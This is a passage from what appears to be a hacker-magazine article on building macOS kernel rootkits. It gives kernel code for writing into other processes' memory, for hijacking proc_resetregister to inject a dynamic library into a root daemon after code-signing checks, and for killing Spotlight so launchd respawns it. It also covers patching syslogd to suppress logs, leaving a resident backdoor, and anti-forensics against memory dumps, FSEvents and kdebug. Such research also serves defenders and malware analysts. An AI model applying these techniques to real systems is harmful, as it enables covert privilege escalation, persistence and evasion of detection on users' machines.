   - From __LINKEDIT segment: fileoff and filesize (so we can read the
   segment).
   - From LC_SYMTAB command: symoff, nsyms, stroff, strsize.
   Refer to [10] for more information about Mach-O file format.
3) Allocate buffer and read the whole __LINKEDIT segment.
4) Solve any required symbol by processing the __LINKEDIT buffer using the
LC_SYMTAB collected information (offsets to symbol and string tables).
5) Do not forget to add the kernel ASLR slide to the addresses. Slide can
be computed by the difference between running __TEXT vmaddr and the one
read from disk.

There is no need to read the whole mach_kernel file into kernel space,
we just need the headers and __LINKEDIT segment, around 1MB, smaller
than the 7.8MB of Mountain Lion 10.8.2 full kernel. Kernel memory is at
a premium :-)


--[ 4 - Executing userland binaries from the kernel

This section describes a technique to execute userland processes
from a kernel extension (not tested but should also be valid from
IOKit drivers). For this purpose wowie and ghalen used the KUNC API
(Kernel-User Notification Center), a straightforward interface to execute
userland executables. One problem with KUNC is that the required symbols
are provided by the Unsupported KPI and Apple has the following note:
The Kernel-User Notification Center APIs are not available to KEXTs that
declare dependencies on the sustainable kernel programming interfaces
(KPIs) introduced in OS X v10.4.

Having different ways to accomplish a given goal is more fun and
improves knowledge, which is this paper's main goal. The technique to be
presented is probably not the most efficient one but it is a good learning
experience about playing with kernel and how everything is implemented.


----[ 4.1 - Writing from kernel memory into userland processes

The first step is to find a way to write to userland process addresses
from a kernel extension. In userland there is the mach_vm_write() function
(or older vm_write()) to write to any arbitrary process, assuming we
have the right permissions to do so (task_for_pid() is our friend).

Its prototype is:

kern_return_t mach_vm_write(vm_map_t target_task,
mach_vm_address_t address, vm_offset_t data,
mach_msg_type_number_t dataCnt);

If you look at the definition of the task structure (a void* at proc
structure but defined at osfmk/kern/task.h) you can find the first
parameter to mach_vm_write in the "map" field. The remaining parameters
are the target address, the data buffer to write and its size.

Do not forget that we need first to use mach_vm_protect (or vm_protect)
to change memory protections if trying to write to the read-only
segments/sections.

The problem with this approach is that it does not work!
The memory protection is changed but mach_vm_write() does not modify the
target address. The answer is that if called like this we are trying
to write data from kernel space directly to the userland space, which
should (obviously!) fail. Remember we need to use copyin/copyout to
copy between the two spaces.

We need another solution and I will present not one but two, both easy
to use. Thanks go to snare for giving me some initial sample code from
his own research.

The first solution uses three functions, vm_map_copyin(),
vm_map_copyout(), and mach_vm_copy(). You can read their description at
osfmk/vm/vm_map.c and vm_user.c in XNU sources.

vm_map_copyin creates an object from a given address located in a given
map that we can insert into another address space. This assures the
correct transition between kernel and user virtual memory spaces.

The vm_map_copyout() function copies the object into the target map,
aka, our target process. We need the vm_map_t info for kernel and target
process - both can be found by iterating proc list or proc_find(),
as previously described.

There is one important detail about vm_map_copyout! It injects the object
"into newly-allocated space in the destination map". What this means is
that we are just copying the data into a new memory address at the user
process and not at the target address we want. Let me show you with an
example of what happens using that command:

char *fname = "nemo_and_snare_rule!";
kern_return_t kr = 0;
vm_map_address_t dst_addr;

kr = vm_map_copyin(kernel_task->map, (vm_map_address_t)fname,
strlen(fname)+1, FALSE, &copy);
kr = vm_map_copyout(task->map, &dst_addr, copy);

dst_addr will contain the value 0x11fa000 (target was a 32 bits process).
Dumping the process memory:

sh-3.2# ./readmem -p 121 -a 0x11fa000 -s 32
[ Readmem v0.4 - (c) fG! ]
--------------------------
Memory protection: rw-/rwx

0x11fa000 6e 65 6d 6f 5f 61 6e 64 5f 73 6e 61 72 65 5f 72 nemo_and_snare_r
0x11fa010 75 6c 65 21 00 00 00 00 00 00 00 00 00 00 00 00 ule!............

At this point we need to copy the contents to the target address we
want to. This can be achieved using mach_vm_copy() - a function that
copies one memory region to another within the same task. The address
where the data was copied to can be found at the second parameter of
vm_map_copyout().

It must be noticed that the first two functions are available as
Private KPIs and mach_vm_copy() is not exported (I cheated in above's
example). Not a big problem since we can easily solve the symbols.

The sample code to write to the Mach-O header of a 32 bits, no ASLR
binary could be something like this:

// get proc_t structure and task pointers
struct proc *p = proc_find(PID);
struct proc *p_kernel = proc_find(0);
struct task *task = (struct task*)(p->task);
struct task *kernel_task = (struct task*)(p_kernel->task);
kern_return_t kr = 0;
vm_prot_t new_prot = VM_PROT_WRITE | VM_PROT_READ;
kr = mach_vm_protect((vm_map_t)task->map, 0x1000, len, FALSE, new_prot);

vm_map_copy_t copy;
char *fname = "nemo_and_snare_rule!";
vm_map_address_t dst_addr;

// create a vm_map_copy_t object so we can insert it at userland process
kr = vm_map_copyin(kernel_task->map, (vm_map_address_t)fname,
strlen(fname)+1, FALSE, &copy);

// copy the object to userland, this will allocate a new space into target
// map
kr = vm_map_copyout((vm_map_t)task->map, &dst_addr, copy);
printf("wrote to userland address 0x%llx\n", CAST_USER_ADDR_T(dst_addr));

// and now we can use mach_vm_copy() because it copies data within the same
// task
kr = mach_vm_copy((vm_map_t)task->map, CAST_USER_ADDR_T(dst_addr),
strlen(fname)+1, 0x1000);
// release references created with proc_find() - must be always done!
proc_rele(p);
proc_rele(p_kernel);

To deallocate that new allocated space in userland vm_map_remove()
is a good candidate:

/*
 * vm_map_remove:
 * Remove the given address range from the target map.
 * This is the exported form of vm_map_delete.
 */
extern kern_return_t
vm_map_remove(vm_map_t         map,
              vm_map_offset_t  start,
              vm_map_offset_t  end,
              boolean_t        flags);

An easy alternative is to just zero those bytes and assume that space
as a small memory leak. It works and it is not a big deal.

The second solution requires a single function and has no
memory allocation at the target process. We are talking about
vm_map_write_user(): "Copy out data from a kernel space into space in
the destination map. The space must already exist in the destination map."

The prototype:
kern_return_t
vm_map_write_user(vm_map_t map, void *src_p, vm_map_address_t dst_addr,
vm_size_t size);

Where map is the vm_map_t of the target process, and src_p the kernel data
buffer we want to write to the process. The previous example using this
function:
struct proc *p = proc_find(PID);
struct task *task = (struct task*)(p->task);
kern_return_t kr = 0;
vm_prot_t new_protection = VM_PROT_WRITE | VM_PROT_READ;
char *fname = "nemo_and_snare_rule!";
// modify memory permissions
kr = mach_vm_protect(task->map, 0x1000, len, FALSE, new_protection);
kr = vm_map_write_user(task->map, fname, 0x1000, strlen(fname)+1);
proc_rele(p);

This alternative is easier and does not allocate new memory at the target.
Do not forget to restore the original memory permissions.

After so many words you are probably asking why not use copyout to copy
from kernel to userland? Well, of course it is possible but there is
a problem. It can't be used to overwrite to arbitrary processes - only
against the current process. Even if we try to change the current map to
another process using vm_map_switch(), copyout will always retrieve the
current process so copyout will fail with EFAULT if we try an address
of another process that does not exists in current. This means that it
can be used, for example, inside a hooked syscall but not to write to
arbitrary processes.


----[ 4.2 - Abusing (again!) dyld to inject and run code

Most of the time hacking is about abusing features or lack-of. This
time we are going to piggyback on dyld and launchd. Poor bastards!
The idea is that launchd will restart our target process and dyld will
be responsible for executing our code. I used the dyld approach in
OS.X/Boubou PoC described at [12] and [34], so why not again? It is easy
to implement and works very well.

The core of this idea is to emulate the DYLD_INSERT_LIBRARIES (equivalent
to LD_PRELOAD for those coming from ELF Unix world) when a new process
is created. The library will be responsible for executing whatever
we want to. In this case we want to modify the Mach-O header before
passing control to dyld. When dyld gains control (it is dyld who passes
control to target's entrypoint not the kernel) it will read the header
from target's memory and process it. This presents an opportunity to
successfully modify and inject the Mach-O header.

The presentations at Secuinside [11] and HitCon [12] discuss the Mach-O
header details and injection process. This is valid for dynamically
linked executables, where execution will start at the dynamic linker
(/usr/lib/dyld) and then continue at the executable entry point.

Launchd is the perfect target because it can automatically respawn daemons
and agents, at root or user privilege level. The idea is to kill a daemon,
intercept the respawn and inject the library we want to be executed. The
privilege level we want to execute at depends on the target daemon.

What we need is to find a good place to intercept the respawn of the
target process and modify its memory before control is passed to dyld.

A simplified version of the binary execution process, adapted from [13] is:

     execve() -> __mac_execve()
                        |
                        v
               exec_activate_image()
                        |
                        v
                    Read file
                        |
                        v
           .----> exec_mach_imgact() -> run dyld -> target entry point
           |            |
           |            v
           |       load_machfile()
           |            |
           |            v
           |      parse_machfile()   [maps the load commands into memory]
           |            |
           |            v
           |       load_dylinker()   [sets image entrypoint to dyld]
           |            |
           |            v
           `--------- (...)

Chapter 7 of [14] and Chapter 13 of [13] thoroughly describe the execution
process in case you are interested in every detail.

The above diagram presents many places where we can modify the new process
memory and its Mach-O header. As previously mentioned, when dyld gains
control it will parse again the Mach-O header so our modification is
guaranteed to be used if made before dyld's control.

We can confirm this by looking at dyld source code [15]:

//
// Entry point for dyld. The kernel loads dyld and jumps to __dyld_start
// which sets up some registers and call this function.
//
// Returns address of main() in target program which __dyld_start jumps to
//
uintptr_t
_main(const macho_header* mainExecutableMH, uintptr_t mainExecutableSlide,
        int argc, const char* argv[], const char* envp[],
        const char* apple[], uintptr_t* startGlue)

One curious detail (without any practical application I can foresee
now) is that dyld does not validate the header - the magic value can
be modified to anything and dyld will happily continue its work. Kernel
data can be trusted, right?


----[ 4.3 - Finding the place to execute the injection

With theory in place it is finally time to move to practice! We need
to find one or more places where we can modify the target process memory
and inject our dynamic library.

The kernel has no symbol stubs so we can't just modify a pointer and
hijack a useful function. One solution is to inline hook the function
prologue and make it jump to our function. We can simplify this by
implementing the whole original function (copy from XNU source into our
rootkit); this way we do not need to return back to the original one,
just restore the original bytes when we finish our evil work.

A good starting point to look for candidate functions is
exec_mach_imgact(). The reason why is that when it returns control
to dyld everything required to execute the new process is set (kernel
side). As much as possible near its end is best.

After exploring exec_mach_imgact, I found a good candidate at
task_set_dyld_info(). It is called twice, one before the image is loaded
into memory, and another after the image is loaded. Clearly, the former
does not interest us so we need to distinguish between each case. This
function is only used at exec_mach_imgact().

Looking at its code in osfmk/kern/task.c:

void
task_set_dyld_info(task_t task, mach_vm_address_t addr,
mach_vm_size_t size)
{
    task_lock(task);
    task->all_image_info_addr = addr;
    task->all_image_info_size = size;
    task_unlock(task);
}

The locks calls are nothing else than macros using a symbol available in
KPIs:

#define task_lock(task)     lck_mtx_lock(&(task)->lock)
#define task_unlock(task)   lck_mtx_unlock(&(task)->lock)

It is a great candidate - we can copy & paste its code into our
rootkit source, add our code to inject the library and then execute
the original function code. Because it is not a static function we can
find its symbol. The first parameter is a task_t structure, which has
a pointer to the correspondent proc_t structure (remember that proc and
task structures are connected to each other via void pointers).

The proposed workflow could be:

1) Find task_set_dyld_info() address.
2) Patch prologue to jump to our function.
3) Execute our function to inject library.
4) Restore original bytes from 2).
5) Execution continues, our library is executed by dyld.

The only problem with this function is here at exec_mach_imgact():

    /*
     * Remember file name for accounting.
     */
    p->p_acflag &= ~AFORK;
    /* If the translated name isn't NULL, then we want to use
     * that translated name as the name we show as the "real" name.
     * Otherwise, use the name passed into exec.
     */
    if (0 != imgp->ip_p_comm[0]) {
        bcopy((caddr_t)imgp->ip_p_comm, (caddr_t)p->p_comm,
            sizeof(p->p_comm));
    } else {
        if (imgp->ip_ndp->ni_cnd.cn_namelen > MAXCOMLEN)
            imgp->ip_ndp->ni_cnd.cn_namelen = MAXCOMLEN;
        bcopy((caddr_t)imgp->ip_ndp->ni_cnd.cn_nameptr, (caddr_t)p->p_comm,
            (unsigned)imgp->ip_ndp->ni_cnd.cn_namelen);
        p->p_comm[imgp->ip_ndp->ni_cnd.cn_namelen] = '\0';
    }

The process name in proc_t structure is only set after the second call
to task_set_dyld_info(), so we can't use it to detect which process
is going to be executed and trigger or not our injection (remember we
are only interested in a specific process to be executed by launchd). A
workaround to this problem is to lookup the open files structure in proc_t
(p_fd field).

An alternative solution is to use another function! There is
an even better one near the end of exec_mach_imgact() called
proc_resetregister(). The advantage of being near the end is that we can
change a lot more things (kernel completed most of its tasks related to
new process execution), opening way for some cute tricks.

Its implementation is also very simple [bsd/kern/kern_proc.c]:

void proc_resetregister(proc_t p)
{
    proc_lock(p);
    p->p_lflag &= ~P_LREGISTER;
    proc_unlock(p);
}

The lock/unlock here are implemented as functions instead of macros and
not exported. We can simply define the macros or change our code to
use lck_mtx_*. This time we have a proc_t structure and can use the
p_comm field to find our target(s) (or proc_name() to get the name of
a given pid). Perfect spot!

With a location where to execute our modifications we can proceed to
the last step, modify the target Mach-O header.


----[ 4.4 - Ideas are great, execution is everything

Assuming that our hijacked function is proc_resetregister(), we can
extract all the information we will need from the proc_t parameter. Let's
proceed with this.

The number of binaries that use ASLR is increasing so the first step is to
find at which memory address is the binary loaded (the Mach-O header to be
more specific). The ASLR slide is generated inside load_machfile() and not
set in a struct/var or returned. One way to solve the problem is to take a
peak at the virtual memory map (vmap) of the target process. The following
does the job (assuming we are inside our own proc_resetregister()):

struct task *task = (struct task*)p->task;
mach_vm_address_t start_address = task->map->hdr.links.start;

Start contains the lower address of the process, which is where the
Mach-O header is located at. This *appears* to hold always true (there
are good reasons to believe it!).

To modify the Mach-O header of the target process we need to parse
the header to find free space where we can add the new LC_LOAD_DYLIB
command. The necessary free space is common - most binaries have enough
slack space between the last command and first code/data.

The header can be retrieved from the user space with vm_map_read_user()
or copyin (because here we are executing in current proc context).
After we have found the free space and the full Mach-O header is in our
buffer, we just need to add a new LC_LOAD_DYLIB command.

The two below diagrams show what needs to be done at the Mach-O header:

.-------------------.

There are other methods to inject the library if there is not enough
space. One that requires only 24 bytes is described at [16].

This approach has one interesting advantage - it is not detectable by code
signing because the injection occurs after its checks and flags are set.
This is the code that sets the flags:

    /*
     * Set code-signing flags if this binary is signed, or if parent has
     * requested them on exec.
     */
    if (load_result.csflags & CS_VALID) {
        imgp->ip_csflags |= load_result.csflags &
            (CS_VALID|
             CS_HARD|CS_KILL|CS_EXEC_SET_HARD|CS_EXEC_SET_KILL);
    } else {
        imgp->ip_csflags &= ~CS_VALID;
    }

    if (p->p_csflags & CS_EXEC_SET_HARD)
        imgp->ip_csflags |= CS_HARD;
    if (p->p_csflags & CS_EXEC_SET_KILL)
        imgp->ip_csflags |= CS_KILL;

The code snippet is from exec_mach_imgact() and located well before our
two candidate functions described in section 4.3. Code signing does not
kill immediately the process. The flags are verified later and a kill
signal sent if code signing was configured to exit on failure (which we
can also modify here).

The only puzzle piece left is which process should we use and how to kill
it. There are many root processes controlled by launchd so it is just
a matter of selecting one with invisible and/or small impact. Spotlight
is for example a good candidate. A code snippet to do the killing:

proc_t victim = proc_find(TARGET_PID);
if (victim != PROC_NULL)
{
    // we need to release reference count from proc_find() before kill
    proc_rele(kill);
    // now we can kill the process or use SIGSEV coz' Spotlight crashes,
    // right? :-)
    psignal(kill, SIGKILL);
}

When launchd respawns the process, we can intercept it at
exec_mach_imgact() and do our magic. The rest is responsibility of the
dynamic library.


----[ 4.5 - The dynamic library

The dynamic library is very easy to create if you use the Xcode template
(oh the drama, hackers use Makefiles!) or just Google for a simple
Makefile.

To execute the library code you can add an entrypoint via a constructor:

extern void init(void) __attribute__ ((constructor));
void init(void)
{
    // do evil stuff here
}

init will be executed as soon as the library is loaded. Another way
could be by modifying the injected process symbol stub and redirect
to an entrypoint function inside the library. While the symbol stub
modification could be made from the kernel, we do not know yet where
library will be loaded so it is harder to execute this. For example, it
could be delayed by hijacking a syscall, wait for its execution and then
modify a symbol. The downside is more time for detection as explained
in next section. Honestly I have not thought much about this case.

To execute commands from the library it is just a matter of fork'ing
and exec'ing whatever command we need. We can also create a new thread
(or multiple) to leave a resident backdoor and so on. Or just execute
the command we need and clean up ourselves to leave no traces.

It is up to you and your particular requirements and imagination :-).


----[ 4.6 - Hiding our tracks

By principle, a rootkit should be as stealth as possible - we need to
cover our tracks to the maximum possible extent. Let me discuss a few
problems and potential solutions with the previously described approaches.

The first one is that we need to restart a target process. This will
leave an immediate clue on a (potentially very) higher PID, depending
when the method is used (near startup it is ok).

Another clue is that we are sending a signal to the target process
and syslogd will capture it. Instead of a kill we could send a SIGSEGV
(Apple's software has bugs, right?), or just temporarily memory patch
syslogd daemon to avoid logging our little trick. Different possibilities
to solve this problem!

The SIGSEGV is particularly interesting since the resulting crash dump
has no useful information and it only leaves this log trail:

12/21/12 3:27:13.093 AM com.apple.launchd[1]: (com.apple.metadata.mds[277])
Job appears to have crashed: Segmentation fault: 11

Patching (temporarily or not) syslogd is rather easy to accomplish. Looking
at Apple's syslogd source we can find the following function in
syslogd/daemon.c:

void process_message(aslmsg msg, uint32_t source)

Near the end it has this code:

/* send message to output modules */
asl_out_message(msg);
if (global.bsd_out_enabled) bsd_out_message(msg);

The asl_out_message() appears to be the interesting place to patch. To
quickly test this theory we can attach gdb to syslogd (warning, ASLR
enabled), and patch that function. We need to search the function address
because there are no debug symbols available.

Let's look at its implementation:

void asl_out_message(aslmsg msg)
{
    dispatch_flush_continuation_cache();
    asl_msg_retain((asl_msg_t *)msg);
    dispatch_async(asl_action_queue, ^{
        _asl_action_message(msg);
        asl_msg_release((asl_msg_t *)msg);
    });
}

There are two external symbols, dispatch_flush_continuation_cache()
and asl_msg_retain(). The former has only a reference and the latter
two. To find the location of asl_out_message() we just need to find out
the proc_t for syslogd process, read and process its symbol table (we
can read from memory or filesystem), correct for ASLR slide, and find
the address of the stub. Since this is not IDA we can't easily find the
cross-references (oh, IDA spoils us).

What we can do is search in the binary the calls to the symbol stub
(it is a relative offset call). Even easier (and probably faster)
is to disassemble and match the address of the call with the stub -
the disassembler will output the final address.

After we have the address where dispatch_flush_continuation_cache() is
called from we just need to find the function prologue and patch it with
a ret (function return is void so no need for xor eax,rax). We can then
restore the original byte after we execute our command. Another function,
bsd_out_message() might need to be patched, but I leave that task to you,
the reader.

Another alternative is to try to recycle the PID that was killed. The
forkproc() function is the one that allocates the new PID for the
child. Might be interesting to research and explore this alternative. You
also might want to reorder the proc list and move the new element to the
original location instead of being in newer location. Many possibilities
to hide and try to detect the rootkit actions. That is why it is fun!

The next issue is that process memory will have our injected library so
we want to remove it as soon as possible. I did some interesting work
in this area but NDA oblige and can't disclose it. It can be done and
you should think about it, or just use a brute approach and kill the
process again and this time do not inject anything. Whatever works :-)

There is no need to have a resident library somewhere at the filesystem
ready to be discovered. We can read and write from and to anywhere the
filesystem so we can store the library code encrypted inside the kernel
module or store it somewhere else, for example in a sqlite3 database
(there are so many spread all over OS X). Before the injection we can
unpack it somewhere, execute it, and then remove when not needed anymore.

One thing I had no time to verify if the impact from Spotlight if we
use the unpacking to filesystem approach. It might be able to detect
the new file and store in its database, so we must be careful over here.


--[ 5 - Revisiting userland<->kernel communication

Fortunately there are many options to establish communication between
kernel and userland applications in OS X. The sysctl interface previously
presented [1] is easy to implement but it is too cumbersome to transfer
large amounts of data. Let me present you additional options.


----[ 5.1 - Character devices and ioctl

The easiest way to have userland<->kernel communication is to create
a character device and use the ioctl interface to control it. We just
need to create and register the new device and add the necessary entry
point functions.

It all starts with the structure cdevsw:
/*
 * Character device switch table
 */
struct cdevsw {
    open_close_fcn_t    *d_open;
    open_close_fcn_t    *d_close;
    read_write_fcn_t    *d_read;
    read_write_fcn_t    *d_write;
    ioctl_fcn_t         *d_ioctl;
    stop_fcn_t          *d_stop;
    reset_fcn_t         *d_reset;
    struct tty          **d_ttys;
    select_fcn_t        *d_select;
    mmap_fcn_t          *d_mmap;
    strategy_fcn_t      *d_strategy;
    void                *d_reserved_1;
    void                *d_reserved_2;
    int                 d_type;
};

The most interesting entrypoints for our purposes are open, close,
ioctl. If you are interested in using this communication channel, you
probably should think about encrypting it or some kind of authentication
method. OS.X/Crisis has no authentication whatsoever so anyone can send
commands to the kernel rootkit after (easily) finding all the possible
ioctl commands.

The code is very simple so there is no point in discussing it here. The
provided source code implements this and kernel control so you can browse
it and verify how it is done.

Besides the problems with encryption, authentication and ioctl commands
reversing, this solution creates a new character device that needs
to be hidden or else it will be too easy to detect. And then we have
additional traces inside the kernel structures that need to be hidden,
creating a vicious circle (rootkits are a vicious circle of hide &
seek and that is why they can be so fun to write about).


----[ 5.2 - Kernel Control KPI

The kernel control KPI is interesting because it allows bidirectional
communication with userland and transfer of large amounts of data. Its
implementation is rather simple via a regular socket (PF_SYSTEM). Apple's
reference documentation can be found at [17] and sample code at [18].

A kernel extension is responsible for creating the socket and the userland
part will read and send data to that same socket (socket access can be
restricted to privileged users or everyone).

The kernel implementation is done by registering a control structure
kern_ctl_reg defined at bsd/sys/kern_control.h. From Apple's example:

// the reverse dns name to be used between kernel and userland
#define BUNDLE_ID   "put.as.hydra"

static struct kern_ctl_reg g_ctl_reg = {
 BUNDLE_ID,      /* use a reverse dns name */
 0,              /* set to 0 for dynamically assigned control ID */
 0,              /* ctl_unit - ignored when CTL_FLAG_REG_ID_UNIT not set */
 /* privileged access required to access this filter */
 CTL_FLAG_PRIVILEGED,
 0,               /* use default send size buffer */
 0,               /* Override receive buffer size */
 ctl_connect,     /* Called when a connection request is accepted */
 ctl_disconnect,  /* called when a connection becomes disconnected */
 NULL,         /* handles data sent from the client to kernel control */
 ctl_set,      /* called when the user process makes the setsockopt call */
 ctl_get       /* called when the user process makes the getsockopt call */
};

The connect and disconnect functions handle userland connections. When a
new connection is established we need to retain the unit id and control
reference - they are required for sending data and removing the kernel
control.

The ctl_get function handles the communication from kernel to userland -
sends data to the socket when client requests it, and ctl_set handles
data from userland to kernel. The kernel data to be sent to userland
should be enqueued using ctl_enqueuedata() (this is where we need the
unit id and control reference).

A quick example of a function to enqueue the PID of a process:

static u_int32_t gClientUnit = 0;
static kern_ctl_ref gClientCtlRef = NULL;
/*
 * get data ready for userland to grab
 * send PID of the suspended process and let the userland daemon do the
 * rest
 */
kern_return_t
queue_userland_data(pid_t pid)
{
    errno_t error = 0;
    if (gClientCtlRef == NULL) return KERN_FAILURE;

    error = ctl_enqueuedata(gClientCtlRef, gClientUnit, &pid,
    sizeof(pid_t), 0);

    if (error) printf("[ERROR] ctl_enqueuedata failed with error: %d\n",
    error);
    return error;
}

Another important detail is about the control ID. Since the recommended
way is to use a dynamically assigned control ID, the userland client
needs somehow to retrieve it. This can be done using a ioctl request
(the reverse dns name must be shared between the kernel and userland).

int gSocket = -1;
struct ctl_info ctl_info;
struct sockaddr_ctl sc;
gSocket = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
// the control ID is dynamically generated so we must obtain sc_id using
// ioctl
memset(&ctl_info, 0, sizeof(ctl_info));
strncpy(ctl_info.ctl_name, "put.as.hydra", MAX_KCTL_NAME);
ctl_info.ctl_name[MAX_KCTL_NAME-1] = '\0';
if (ioctl(gSocket, CTLIOCGINFO, &ctl_info) == -1)
{
    perror("ioctl CTLIOCGINFO");
    exit(1);
}
else
    printf("ctl_id: 0x%x for ctl_name: %s\n", ctl_info.ctl_id,
ctl_info.ctl_name);
// build the sockaddr control structure and finally connect to the socket
bzero(&sc, sizeof(struct sockaddr_ctl));
sc.sc_len = sizeof(struct sockaddr_ctl);
sc.sc_family = AF_SYSTEM;
sc.ss_sysaddr = AF_SYS_CONTROL;
sc.sc_id = ctl_info.ctl_id;
sc.sc_unit = 0;
ret = connect(gSocket, (struct sockaddr*)&sc, sizeof(sc));

After connection to the socket is established, the userland client can
send data using setsockopt() and receive with recv(). The remaining
implementation details are easy to understand by reading Apple's
referenced sample code.

This communication channel might not be that interesting for rootkit'ing
purposes because it requires additional effort to hide, in particular
the socket information that can be explored by memory forensic tools. If
commercial spyware is using character devices for communication then we
can't forget this possibility when analysing a potentially compromised
machine.

Nevertheless it can be interesting for other purposes. As an example,
I created a PoC (to be released later) to stop certain processes when
they are created ( p->p_stat = SSTOP) and communicate their PID to a
userland daemon. The userland daemon attaches to the process and modifies
whatever it needs. In this particular case it is used to patch code
signed applications without needing to resign and patch any checksum
checks. We already saw that OS X code-signining verifications are done
before the process is stopped and do not detect these modifications
(application own run-time code checksum checks are another story!). It
is not the best solution but just a nice set of tricks and demo usage
of this communication channel.


----[ 5.3 - Alternative channels

The two presented solutions are easy to setup and use but also easy
to detect. Their main problem is that they leave "permanent" traces
that need to be hidden (kernel structures for example). This increases
rootkit's complexity and chances of being detected.

Covert channels are a lot more appropriate and a lot has been written
about them. Since it is so easy to use almost any kernel function, the
possibilities to be creative in this department are much higher. Data can
be stealthy read and written anywhere in the filesystem, bypassing many
detection and instrumentation mechanisms as it will be shown next. At
the limit there is no real need for a direct communication channel! For
example, data can be encoded in a binary and intercepted when it is
executed. The possibilities are really endless. This very short section
is just a reminder that rootkit design can be different from what is
usually done and that you should think about it, whether you belong to
the offensive or defensive side.


--[ 6 - Anti-forensics

Mac OS X kernel is instrumentation rich, featuring DTrace and
others. These can assist in rootkit uncloaking. Memory forensics is
also playing an important role these days in malware detection and
analysis. This section goal is to present some ideas on how to attack or
hide from these technologies. It is not an exhaustive list but it tries
to cover the main ones. OS X kernel is still big and full of interesting
places to be explored. Keep that in mind! Due to time constraints it is
not possible to write about fooling/defeating the memory forensics tools
as I initially planned. It was somewhat similar to what was presented at
29C3 in Defeating Windows memory forensics presentation [33] and other
similar work presented in the past.


----[ 6.1 - Cheap tricks to reduce our footprint

An extremely easy trick to pull without any side consequences for us
is to remove the Mach-O header from process's memory. A memory dump
will require additional effort to find and rebuild the original binary
(harder in userland binaries, simpler in kernel extensions). Do not
forget that Mach-O header permissions are R-X so make it writable first.

Kernel extensions must have a start and stop function. Their prototype
specifies a kmod_info_t structure as first parameter. It is part of a
linked list of all loaded kernel extensions (used to hide the rootkit
from kextstat but now marked deprecated) and contains a very useful
field to apply this cheap trick.

typedef struct kmod_info {
    struct kmod_info  * next;
    int32_t             info_version;          // version of this structure
    uint32_t            id;
    char                name[KMOD_MAX_NAME];
    char                version[KMOD_MAX_NAME];
    int32_t             reference_count;       // # linkage refs to this
    kmod_reference_t  * reference_list;        // who this refs (links on)
    vm_address_t        address;               // starting address
    vm_size_t           size;                  // total size
    vm_size_t           hdr_size;              // unwired hdr size
    kmod_start_func_t * start;
    kmod_stop_func_t  * stop;
} kmod_info_t;

The "address" field contains the starting address of the currently loaded
kext, including the ASLR slide (kernel and kernel extensions Mach-O header
values include the current kernel ASLR slide). With this information we
just need to find out the total size of the header and nuke it:

int nuke_mach_header(mach_vm_address_t address)
{
    struct mach_header *mh = (struct mach_header_64*)address;
    uint32_t header_size = 0;
    if (mh->magic == MH_MAGIC_64)
    {
        header_size = mh->sizeofcmds + sizeof(struct mach_header_64);
    }
    else return 1;
    // we have total header size and startup address
    // disable CR0 write protection
    disable_wp();
    memset((void*)my_address, 0, header_size);
    enable_wp();
    return 0;
}

Instead of just zero'ing the header you could fill it with random junk
data for fun. You can even mangle data from the other commands (LINKEDIT,
LC_SYMTAB, LC_DYSYMTAB, LC_UUID). For example, there are no symbol stubs
in kernel - symbols are solved when kernel extension is loaded and calls
are made directly to the referenced symbol. This is a problem because
it can be used to detect valid code and get hints on what it is trying
to do. One can generate a table of all kernel symbols and use it to find
cross references in kernel memory and dump that code.

Function pointers can help to hide our code - the question is how easy or
not it is to bootstrap the rootkit to search the required symbols. One
solution can be to use the techniques described before to find the
symbols and then mangle the bootstrap code - only leave in memory code
using function pointers. Be creative, try to reduce your footprint to
the maximum :-).


----[ 6.2 - Attacking DTrace and other instrumentation features

Mac OS X has many instrumentation features available. There are at
least DTrace, FSEvents, Kauth, kdebug, and TrustedBSD. TrustedBSD's
original goal is not instrumentation related but can be used (or abused)
for this purpose. Kauth is explored in Section 6.3 with AV-Monster II,
while all the others in the next subsections.


------[ 6.2.1 - FSEvents

FSEvents is an API for file system notification. Applications register
for events that are interested in and receive them via /dev/fsevents. A
file system monitor can be built on top of this - the usual suspects
[13] and [14] offer a good explanation about its internals and code
samples. Jonathan Levin has a "filemon" tool available at his book
companion web site.

The responsibility to add the events belongs to the function add_fsevent()
[bsd/vfs/vfs_fsevents.c]. It is a bit long vararg function and I do
not want to spend space and time analysing it. Amit Singh has a nice
figure on page 1421 of [14] with functions that add events. For example,
the open syscall can generate a file create event (FSE_CREATE_FILE).

The next diagram shows the how the event is added:

open() -> open_nocancel() -> open1()    [bsd/vfs/vfs_syscalls.c]
                               |
                               v
[bsd/vfs/vfs_vnops.c]    vn_open_auth() -> vn_open_auth_do_create()
                                                    |
                                                    v
[bsd/vfs/vfs_fsevents.c]       add_fsevent() <- need_fsevent()

In this particular case we could hijack need_fsevent(), match the file we
want to hide and return 0 to avoid event generation. In many cases there
is a direct call to add_fsevent() so we also need to hijack it. Inside our
new function we need to retrieve the necessary information to match the
event we want to hide and return EINVAL or 0 in those cases. You should
study the add_fsevent() function to understand how to implement this. I
do not think there is much value in describing it here - there are more
(interesting) topics to cover.


------[ 6.2.2 - kdebug

kdebug is another (rather obscure) kernel trace facility used only by
Apple utils such as fs_usage and sc_usage. Documentation is poor and the
best references are those utils source code and a few pages by Levin [13].
The relevant include file is bsd/sys/kdebug.h. kdebug is implemented in
kernel functions that might produce relevant events using KERNEL_DEBUG()
macro. The kernel functions involved (in that macro) are kernel_debug()
and kernel_debug_internal() (with always inline attribute).

A 32 bits integer is used for the debug messages, with the following
format:

 ----------------------------------------------------------------------
|              |               |                               |Func   |
| Class (8)    | SubClass (8)  |          Code (14)            |Qual(2)|
 ----------------------------------------------------------------------

For example, filesystem operations use class DBG_FSYSTEM (3) and
different subclasses to filter between different operations such as read
and writes to filesystem, vnode operations, HFS events, etc (consult
kdebug.h include).

Macros exist to encode the integer for each available class. Using BSD
class as an example:

#define KDBG_CODE(Class, SubClass, code) (((Class & 0xff) << 24) |
((SubClass & 0xff) << 16) | ((code & 0x3fff)  << 2))
#define BSDDBG_CODE(SubClass, code) KDBG_CODE(DBG_BSD, SubClass, code)

Grep'ing XNU source code for BSDDBG_CODE will show where kdebug is
implemented in all BSD related functions. The fs_usage util traces
the file system related system calls (its source is located in
system_cmds-550.10 package). For example, it contains the following
code for open() syscall:

#define BSC_open                0x040C0014

If we look at kdebug's include we have the following Class and SubClass
codes:

#define DBG_BSD                 4
#define DBG_BSD_EXCP_SC         0x0C    /* System Calls */

Open is syscall #5 and it matches the code: (0x040C0014 & 0x3FFF) >>
2 = 0x5

Grep'ing for the DBG_BSD_EXCP_SC SubClass will land us into
bsd/dev/i386/systemcalls.c - the file that implements the C portion of
